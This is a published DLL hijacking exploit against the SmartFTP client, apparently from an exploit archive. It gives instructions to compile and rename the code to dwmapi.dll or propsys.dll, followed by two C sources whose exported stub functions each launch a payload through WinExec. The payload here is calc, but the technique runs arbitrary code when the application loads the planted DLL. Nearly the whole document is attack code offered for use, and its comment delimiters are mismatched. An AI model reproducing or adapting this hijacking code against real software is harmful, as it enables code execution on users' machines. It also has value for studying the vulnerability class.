SmartFTP DLL Hijacking Exploit (dwmapi.dll, propsys.dll)
========================================================

/*
#SmartFTP  DLL Hijacking Exploit (dwmapi.dll Ð¼ propsys.dll )

#Author : anT!-Tr0J4n

#Greetz : Dev-PoinT.com ~ inj3ct0r.com  ~ All Dev-poinT members and my friends

#Email  : D3v-PoinT[at]hotmail[d0t]com & C1EH[at]Hotmail[d0t]com

#Software Link: http://www.smartftp.com

#Tested on: Windows XP sp3

# Home  : www.Dev-PoinT.com

--------------------------
How  TO use : Compile and rename to dwmapi.dll Ð¼ propsys.dll , create a file in the same dir with one of the following extensions.
check the result        

-------------------------

#dwmapi.dll (code)
==============
*/


#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void  DwmDefWindowProc() { evil(); }
DLLIMPORT void  DwmEnableBlurBehindWindow() { evil(); }
DLLIMPORT void  DwmEnableComposition() { evil(); }
DLLIMPORT void  DwmEnableMMCSS() { evil(); }
DLLIMPORT void  DwmExtendFrameIntoClientArea() { evil(); }
DLLIMPORT void  DwmGetColorizationColor() { evil(); }
DLLIMPORT void  DwmGetCompositionTimingInfo() { evil(); }
DLLIMPORT void  DwmGetWindowAttribute() { evil(); }
DLLIMPORT void  DwmIsCompositionEnabled() { evil(); }
DLLIMPORT void  DwmModifyPreviousDxFrameDuration() { evil(); }
DLLIMPORT void  DwmQueryThumbnailSourceSize() { evil(); }
DLLIMPORT void  DwmRegisterThumbnail() { evil(); }
DLLIMPORT void  DwmSetDxFrameDuration() { evil(); }
DLLIMPORT void  DwmSetPresentParameters() { evil(); }
DLLIMPORT void  DwmSetWindowAttribute() { evil(); }
DLLIMPORT void  DwmUnregisterThumbnail() { evil(); }
DLLIMPORT void  DwmUpdateThumbnailProperties() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}


=============
propsys.dll (code)
=============
*/


#include <windows.h>
#define DLLIMPORT __declspec (dllexport)

DLLIMPORT void  InitPropVariantFromBooleanVector() { evil(); }
DLLIMPORT void  InitPropVariantFromCLSID() { evil(); }
DLLIMPORT void  InitPropVariantFromDoubleVector() { evil(); }
DLLIMPORT void  InitPropVariantFromFileTime() { evil(); }
DLLIMPORT void  InitPropVariantFromFileTimeVector () { evil(); }
DLLIMPORT void  InitPropVariantFromGUIDAsString() { evil(); }
DLLIMPORT void  InitPropVariantFromInt16Vector() { evil(); }
DLLIMPORT void  InitPropVariantFromInt32Vector() { evil(); }
DLLIMPORT void  InitPropVariantFromInt64Vector() { evil(); }
DLLIMPORT void  InitPropVariantFromPropVariantVectorElem() { evil(); }
DLLIMPORT void  InitPropVariantFromResource() { evil(); }
DLLIMPORT void  InitPropVariantFromStrRet() { evil(); }
DLLIMPORT void  InitPropVariantFromStringAsVector() { evil(); }
DLLIMPORT void  InitPropVariantFromStringVector() { evil(); }
DLLIMPORT void  InitPropVariantFromUInt16Vector() { evil(); }
DLLIMPORT void  InitPropVariantFromUInt32Vector() { evil(); }
DLLIMPORT void  InitPropVariantFromUInt64Vector() { evil(); }
DLLIMPORT void  InitPropVariantVectorFromPropVariant() { evil(); }
DLLIMPORT void  InitVariantFromBooleanArray() { evil(); }
DLLIMPORT void  InitVariantFromBuffer() { evil(); }
DLLIMPORT void  InitVariantFromDoubleArray() { evil(); }
DLLIMPORT void  InitVariantFromFileTime() { evil(); }
DLLIMPORT void  InitVariantFromFileTimeArray() { evil(); }
DLLIMPORT void  InitVariantFromGUIDAsString() { evil(); }
DLLIMPORT void  InitVariantFromInt16Array() { evil(); }
DLLIMPORT void  InitVariantFromInt32Array() { evil(); }
DLLIMPORT void  InitVariantFromInt64Array() { evil(); }
DLLIMPORT void  InitVariantFromResource() { evil(); }
DLLIMPORT void  InitVariantFromStrRet() { evil(); }
DLLIMPORT void  InitVariantFromStringArray() { evil(); }
DLLIMPORT void  InitVariantFromUInt16Array() { evil(); }
DLLIMPORT void  InitVariantFromUInt32Array() { evil(); }
DLLIMPORT void  InitVariantFromUInt64Array() { evil(); }
DLLIMPORT void  InitVariantFromVariantArrayElem() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}



